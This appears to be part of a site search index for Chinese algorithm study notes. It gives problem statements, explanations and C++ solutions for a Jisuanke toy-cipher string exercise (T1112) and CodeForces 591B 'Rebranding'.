\u52a0\u5bc6\u7684\u75c5\u5386\u5355 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 65536 kB 1.2. Problem Description # \u5c0f\u82f1\u662f\u836f\u5b66\u4e13\u4e1a\u5927\u4e09\u7684\u5b66\u751f\uff0c\u6691\u5047\u671f\u95f4\u83b7\u5f97\u4e86\u53bb\u533b\u9662\u836f\u623f\u5b9e\u4e60\u7684\u673a\u4f1a\u3002 \u5728\u836f\u623f\u5b9e\u4e60\u671f\u95f4\uff0c\u5c0f\u82f1\u624e\u5b9e\u7684\u4e13\u4e1a\u57fa\u7840\u83b7\u5f97\u4e86\u533b\u751f\u7684\u4e00\u81f4\u597d\u8bc4\uff0c\u5f97\u77e5\u5c0f\u82f1\u5728\u8ba1\u7b97\u6982\u8bba\u4e2d\u53d6\u5f97\u8fc7\u597d\u6210\u7ee9\u540e\uff0c\u4e3b\u4efb\u53c8\u989d\u5916\u4ea4\u7ed9\u5979\u4e00\u9879\u4efb\u52a1\uff0c\u89e3\u5bc6\u6297\u6218\u65f6\u671f\u88ab\u52a0\u5bc6\u8fc7\u7684\u4e00\u4e9b\u4f24\u5458\u7684\u540d\u5355\u3002 \u7ecf\u8fc7\u7814\u7a76\uff0c\u5c0f\u82f1\u53d1\u73b0\u4e86\u5982\u4e0b\u52a0\u5bc6\u89c4\u5f8b\uff08\u62ec\u53f7\u4e2d\u662f\u4e00\u4e2a \"\u539f\u6587 \\to \u5bc6\u6587\" \u7684\u4f8b\u5b50\uff09 \u539f\u6587\u4e2d\u6240\u6709\u7684\u5b57\u7b26\u90fd\u5728\u5b57\u6bcd\u8868\u4e2d\u88ab\u5faa\u73af\u53f3\u79fb\u4e86\u4e09\u4e2a\u4f4d\u7f6e\uff08 abz -> dec \uff09 \u9006\u5e8f\u5b58\u50a8 \uff08abcd -> dcba \uff09 \u5927\u5c0f\u5199\u53cd\u8f6c \uff08abXY -> ABxy\uff09 1.3. Input # \u539f\u6587\u3002\uff08\u957f\u5ea6\u5c0f\u4e8e 50 \u4e14\u53ea\u5305\u542b\u5927\u5c0f\u5199\u5b57\u6bcd\uff09 1.4. Output # \u8f93\u51fa\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u3002 \u8f93\u51fa\u65f6\u6bcf\u884c\u672b\u5c3e\u7684\u591a\u4f59\u7a7a\u683c\uff0c\u4e0d\u5f71\u54cd\u7b54\u6848\u6b63\u786e\u6027 1.5. Sample Input # GSOOWFASOq 1.6. Sample Output # Trvdizrrvj 1.7. Source # \u8ba1\u849c\u5ba2 T1112 \u52a0\u5bc6\u7684\u75c5\u5386\u5355 2. \u89e3\u8bfb # \u5b57\u7b26\u4e32\u5904\u7406\uff0c\u8003\u8651\u5927\u5c0f\u5199\u5b57\u6bcd\u5bf9\u5e94\u7684 ASCII \u7801 A - Z: 65 - 90 a - z: 97 - 122 \u8981\u5bf9\u5b57\u6bcd\u8fdb\u884c\u5927\u5c0f\u5199\u53cd\u8f6c\uff0c\u53ea\u9700\u8981\u5c06\u5927\u5199\u5b57\u6bcd\u7684ASCII\u7801\u52a0\u4e0a 32 \uff0c\u5c0f\u5199\u5b57\u6bcd\u7684 ASCII \u7801\u51cf\u53bb 32 \u5373\u53ef\u3002 \u6b64\u5904\u8fd8\u9700\u8981\u6ce8\u610f\u7684\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u9898\u76ee\u8981\u6c42\u5b57\u7b26\u5faa\u73af\u53f3\u79fb\uff0c\u6240\u4ee5\u9700\u8981\u5224\u65ad\u79fb\u4f4d\u540e\u4f1a\u8d85\u51fa\u8303\u56f4\u7684\u5b57\u6bcd\uff0c\u5c06\u5176\u8d85\u51fa\u8303\u56f4\u7684\u503c\u52a0\u4e0a a \u6216 A \uff0c\u5373\u53ef\u5f97\u5230\u5176\u5faa\u73af\u53f3\u79fb\u7684\u7ed3\u679c\u3002 3. \u4ee3\u7801 # #include <iostream> #include <string.h> using namespace std; int main() { // \u5b58\u50a8\u8f93\u5165\u5b57\u7b26 string buffer; // \u8f93\u5165 cin >> buffer; // \u5b58\u50a8\u957f\u5ea6 size_t bufferSize = buffer.size(); if (bufferSize > 0) { // \u5927\u5c0f\u5199\u53cd\u8f6c for (size_t i = 0; i < bufferSize; i++) { // \u5224\u65ad\u5927\u5c0f\u5199 if (buffer[i] >= 'a') { // \u5c0f\u5199\u8f6c\u5927\u5199 buffer[i] -= 32; } else { // \u5927\u5199\u8f6c\u5c0f\u5199 buffer[i] += 32; } } // \u9006\u5e8f\u5b58\u50a8 string bufferRev; bufferRev.resize(bufferSize); // \u9006\u5e8f for (size_t i = 0; i < bufferSize; i++) { bufferRev[i] = buffer[bufferSize - i - 1]; } // \u6240\u6709\u5b57\u7b26\u53f3\u79fb\u4e09\u4f4d for (size_t i = 0; i < bufferSize; i++) { // \u5224\u65ad\u5927\u5c0f\u5199 if (bufferRev[i] >= 'a') { // \u5c0f\u5199 // \u53f3\u79fb3\u4f4d bufferRev[i] += 3; // \u82e5\u8d85\u51fa\u8303\u56f4 if (bufferRev[i] > 'z') { bufferRev[i] %= 'z' + 1; bufferRev[i] += 'a'; } } else { // \u5927\u5199 // \u53f3\u79fb3\u4f4d bufferRev[i] += 3; // \u82e5\u8d85\u51fa\u8303\u56f4 if (bufferRev[i] > 'Z') { bufferRev[i] %= 'Z' + 1; bufferRev[i] += 'A'; } } } // \u8f93\u51fa printf(\"%s\\n\", bufferRev.c_str()); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u8ba1\u849c\u5ba2 T1112 \u52a0\u5bc6\u7684\u75c5\u5386\u5355"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#t1112","text":"","title":"\u8ba1\u849c\u5ba2 T1112 \u52a0\u5bc6\u7684\u75c5\u5386\u5355"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#_1","text":"\u8ba1\u849c\u5ba2 T1112 \u52a0\u5bc6\u7684\u75c5\u5386\u5355 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 65536 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#12-problem-description","text":"\u5c0f\u82f1\u662f\u836f\u5b66\u4e13\u4e1a\u5927\u4e09\u7684\u5b66\u751f\uff0c\u6691\u5047\u671f\u95f4\u83b7\u5f97\u4e86\u53bb\u533b\u9662\u836f\u623f\u5b9e\u4e60\u7684\u673a\u4f1a\u3002 \u5728\u836f\u623f\u5b9e\u4e60\u671f\u95f4\uff0c\u5c0f\u82f1\u624e\u5b9e\u7684\u4e13\u4e1a\u57fa\u7840\u83b7\u5f97\u4e86\u533b\u751f\u7684\u4e00\u81f4\u597d\u8bc4\uff0c\u5f97\u77e5\u5c0f\u82f1\u5728\u8ba1\u7b97\u6982\u8bba\u4e2d\u53d6\u5f97\u8fc7\u597d\u6210\u7ee9\u540e\uff0c\u4e3b\u4efb\u53c8\u989d\u5916\u4ea4\u7ed9\u5979\u4e00\u9879\u4efb\u52a1\uff0c\u89e3\u5bc6\u6297\u6218\u65f6\u671f\u88ab\u52a0\u5bc6\u8fc7\u7684\u4e00\u4e9b\u4f24\u5458\u7684\u540d\u5355\u3002 \u7ecf\u8fc7\u7814\u7a76\uff0c\u5c0f\u82f1\u53d1\u73b0\u4e86\u5982\u4e0b\u52a0\u5bc6\u89c4\u5f8b\uff08\u62ec\u53f7\u4e2d\u662f\u4e00\u4e2a \"\u539f\u6587 \\to \u5bc6\u6587\" \u7684\u4f8b\u5b50\uff09 \u539f\u6587\u4e2d\u6240\u6709\u7684\u5b57\u7b26\u90fd\u5728\u5b57\u6bcd\u8868\u4e2d\u88ab\u5faa\u73af\u53f3\u79fb\u4e86\u4e09\u4e2a\u4f4d\u7f6e\uff08 abz -> dec \uff09 \u9006\u5e8f\u5b58\u50a8 \uff08abcd -> dcba \uff09 \u5927\u5c0f\u5199\u53cd\u8f6c \uff08abXY -> ABxy\uff09","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#13-input","text":"\u539f\u6587\u3002\uff08\u957f\u5ea6\u5c0f\u4e8e 50 \u4e14\u53ea\u5305\u542b\u5927\u5c0f\u5199\u5b57\u6bcd\uff09","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#14-output","text":"\u8f93\u51fa\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u3002 \u8f93\u51fa\u65f6\u6bcf\u884c\u672b\u5c3e\u7684\u591a\u4f59\u7a7a\u683c\uff0c\u4e0d\u5f71\u54cd\u7b54\u6848\u6b63\u786e\u6027","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#15-sample-input","text":"GSOOWFASOq","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#16-sample-output","text":"Trvdizrrvj","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#17-source","text":"\u8ba1\u849c\u5ba2 T1112 \u52a0\u5bc6\u7684\u75c5\u5386\u5355","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#2","text":"\u5b57\u7b26\u4e32\u5904\u7406\uff0c\u8003\u8651\u5927\u5c0f\u5199\u5b57\u6bcd\u5bf9\u5e94\u7684 ASCII \u7801 A - Z: 65 - 90 a - z: 97 - 122 \u8981\u5bf9\u5b57\u6bcd\u8fdb\u884c\u5927\u5c0f\u5199\u53cd\u8f6c\uff0c\u53ea\u9700\u8981\u5c06\u5927\u5199\u5b57\u6bcd\u7684ASCII\u7801\u52a0\u4e0a 32 \uff0c\u5c0f\u5199\u5b57\u6bcd\u7684 ASCII \u7801\u51cf\u53bb 32 \u5373\u53ef\u3002 \u6b64\u5904\u8fd8\u9700\u8981\u6ce8\u610f\u7684\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u9898\u76ee\u8981\u6c42\u5b57\u7b26\u5faa\u73af\u53f3\u79fb\uff0c\u6240\u4ee5\u9700\u8981\u5224\u65ad\u79fb\u4f4d\u540e\u4f1a\u8d85\u51fa\u8303\u56f4\u7684\u5b57\u6bcd\uff0c\u5c06\u5176\u8d85\u51fa\u8303\u56f4\u7684\u503c\u52a0\u4e0a a \u6216 A \uff0c\u5373\u53ef\u5f97\u5230\u5176\u5faa\u73af\u53f3\u79fb\u7684\u7ed3\u679c\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/#3","text":"#include <iostream> #include <string.h> using namespace std; int main() { // \u5b58\u50a8\u8f93\u5165\u5b57\u7b26 string buffer; // \u8f93\u5165 cin >> buffer; // \u5b58\u50a8\u957f\u5ea6 size_t bufferSize = buffer.size(); if (bufferSize > 0) { // \u5927\u5c0f\u5199\u53cd\u8f6c for (size_t i = 0; i < bufferSize; i++) { // \u5224\u65ad\u5927\u5c0f\u5199 if (buffer[i] >= 'a') { // \u5c0f\u5199\u8f6c\u5927\u5199 buffer[i] -= 32; } else { // \u5927\u5199\u8f6c\u5c0f\u5199 buffer[i] += 32; } } // \u9006\u5e8f\u5b58\u50a8 string bufferRev; bufferRev.resize(bufferSize); // \u9006\u5e8f for (size_t i = 0; i < bufferSize; i++) { bufferRev[i] = buffer[bufferSize - i - 1]; } // \u6240\u6709\u5b57\u7b26\u53f3\u79fb\u4e09\u4f4d for (size_t i = 0; i < bufferSize; i++) { // \u5224\u65ad\u5927\u5c0f\u5199 if (bufferRev[i] >= 'a') { // \u5c0f\u5199 // \u53f3\u79fb3\u4f4d bufferRev[i] += 3; // \u82e5\u8d85\u51fa\u8303\u56f4 if (bufferRev[i] > 'z') { bufferRev[i] %= 'z' + 1; bufferRev[i] += 'a'; } } else { // \u5927\u5199 // \u53f3\u79fb3\u4f4d bufferRev[i] += 3; // \u82e5\u8d85\u51fa\u8303\u56f4 if (bufferRev[i] > 'Z') { bufferRev[i] %= 'Z' + 1; bufferRev[i] += 'A'; } } } // \u8f93\u51fa printf(\"%s\\n\", bufferRev.c_str()); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/","text":"CodeForces 591 B. Rebranding # \u76ee\u5f55 # CodeForces 591 B. Rebranding \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1 1.6. Sample Output 1 1.7. Sample Input 2 1.8. Sample Output 2 1.9. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2 seconds Memory Limit: 256 megabytes 1.2. Problem Description # The name of one small but proud corporation consists of n lowercase English letters. The Corporation has decided to try rebranding \u2014 an active marketing strategy, that includes a set of measures to change either the brand (both for the company and the goods it produces) or its components: the name, the logo, the slogan. They decided to start with the name. For this purpose the corporation has consecutively hired m designers. Once a company hires the i -th designer, he immediately contributes to the creation of a new corporation name as follows: he takes the newest version of the name and replaces all the letters xi by yi , and all the letters yi by xi . This results in the new version. It is possible that some of these letters do no occur in the string. It may also happen that xi coincides with yi . The version of the name received after the work of the last designer becomes the new name of the corporation. Manager Arkady has recently got a job in this company, but is already soaked in the spirit of teamwork and is very worried about the success of the rebranding. Naturally, he can't wait to find out what is the new name the Corporation will receive. Satisfy Arkady's curiosity and tell him the final version of the name. 1.3. Input # The first line of the input contains two integers n and m ( 1\u2009\\le\u2009n,\u2009m\u2009\\le\u2009200\u2009000 ) \u2014 the length of the initial name and the number of designers hired, respectively. The second line consists of n lowercase English letters and represents the original name of the corporation. Next m lines contain the descriptions of the designers' actions: the i -th of them contains two space-separated lowercase English letters xi and yi . 1.4. Output # Print the new name of the corporation. 1.5. Sample Input 1 # 6 1 police p m 1.6. Sample Output 1 # molice 1.7. Sample Input 2 # 11 6 abacabadaba a b b c a d e g f a b b 1.8. Sample Output 2 # cdcbcdcfcdc 1.9. Source # CodeForces 591 B. Rebranding 2. \u89e3\u8bfb # \u5b57\u7b26\u4e32\u5904\u7406\uff0c\u76f4\u63a5\u5bf9\u6574\u4e2a\u8f93\u5165\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362\u4f1a\u8d85\u65f6\uff0c\u6240\u4ee5\u5148\u6784\u5efa\u4e00\u4e2a26\u4e2a\u5b57\u6bcd\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5bf9\u5b57\u7b26\u4e32\u4e2d\u7684\u5b57\u6bcd\u8fdb\u884c\u66ff\u6362\uff0c\u6700\u540e\u5bf9\u8f93\u5165\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362\u3002 3. \u4ee3\u7801 # #include <iostream> #include <vector> using namespace std; vector<char> vt; int main() { int n, m, size; scanf(\"%d %d\", &n, &m); string str; char a, b; cin >> str; size = 26; // vector\u5b58\u50a8 for (int i = 0; i < size; i++) { vt.push_back('a' + i); } // \u5bf926\u4e2a\u5b57\u6bcd\u8fdb\u884c\u66ff\u6362 for (int i = 0; i < m; i++) { cin >> a >> b; for (int j = 0; j < size; j++) { if (vt[j] == a) { vt[j] = b; } else if (vt[j] == b) { vt[j] = a; } } } // \u5bf9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362 for (size_t i = 0; i < str.size(); i++) { str[i] = vt[str[i] - 'a']; } cout << str << endl; return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.CodeForces 591 B Rebranding"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#codeforces-591-b-rebranding","text":"","title":"CodeForces 591 B. Rebranding"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#_1","text":"CodeForces 591 B. Rebranding \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1 1.6. Sample Output 1 1.7. Sample Input 2 1.8. Sample Output 2 1.9. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#11-limit","text":"Time Limit: 2 seconds Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#12-problem-description","text":"The name of one small but proud corporation consists of n lowercase English letters. The Corporation has decided to try rebranding \u2014 an active marketing strategy, that includes a set of measures to change either the brand (both for the company and the goods it produces) or its components: the name, the logo, the slogan. They decided to start with the name. For this purpose the corporation has consecutively hired m designers. Once a company hires the i -th designer, he immediately contributes to the creation of a new corporation name as follows: he takes the newest version of the name and replaces all the letters xi by yi , and all the letters yi by xi . This results in the new version. It is possible that some of these letters do no occur in the string. It may also happen that xi coincides with yi . The version of the name received after the work of the last designer becomes the new name of the corporation. Manager Arkady has recently got a job in this company, but is already soaked in the spirit of teamwork and is very worried about the success of the rebranding. Naturally, he can't wait to find out what is the new name the Corporation will receive. Satisfy Arkady's curiosity and tell him the final version of the name.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#13-input","text":"The first line of the input contains two integers n and m ( 1\u2009\\le\u2009n,\u2009m\u2009\\le\u2009200\u2009000 ) \u2014 the length of the initial name and the number of designers hired, respectively. The second line consists of n lowercase English letters and represents the original name of the corporation. Next m lines contain the descriptions of the designers' actions: the i -th of them contains two space-separated lowercase English letters xi and yi .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#14-output","text":"Print the new name of the corporation.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#15-sample-input-1","text":"6 1 police p m","title":"1.5. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#16-sample-output-1","text":"molice","title":"1.6. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#17-sample-input-2","text":"11 6 abacabadaba a b b c a d e g f a b b","title":"1.7. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#18-sample-output-2","text":"cdcbcdcfcdc","title":"1.8. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#19-source","text":"CodeForces 591 B. Rebranding","title":"1.9. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#2","text":"\u5b57\u7b26\u4e32\u5904\u7406\uff0c\u76f4\u63a5\u5bf9\u6574\u4e2a\u8f93\u5165\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362\u4f1a\u8d85\u65f6\uff0c\u6240\u4ee5\u5148\u6784\u5efa\u4e00\u4e2a26\u4e2a\u5b57\u6bcd\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5bf9\u5b57\u7b26\u4e32\u4e2d\u7684\u5b57\u6bcd\u8fdb\u884c\u66ff\u6362\uff0c\u6700\u540e\u5bf9\u8f93\u5165\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.CodeForces_591_B_Rebranding/#3","text":"#include <iostream> #include <vector> using namespace std; vector<char> vt; int main() { int n, m, size; scanf(\"%d %d\", &n, &m); string str; char a, b; cin >> str; size = 26; // vector\u5b58\u50a8 for (int i = 0; i < size; i++) { vt.push_back('a' + i); } // \u5bf926\u4e2a\u5b57\u6bcd\u8fdb\u884c\u66ff\u6362 for (int i = 0; i < m; i++) { cin >> a >> b; for (int j = 0; j < size; j++) { if (vt[j] == a) { vt[j] = b; } else if (vt[j] == b) { vt[j] = a; } } } // \u5bf9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u66ff\u6362 for (size_t i = 0; i < str.size(); i++) { str[i] = vt[str[i] - 'a']; } cout << str << endl; return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. 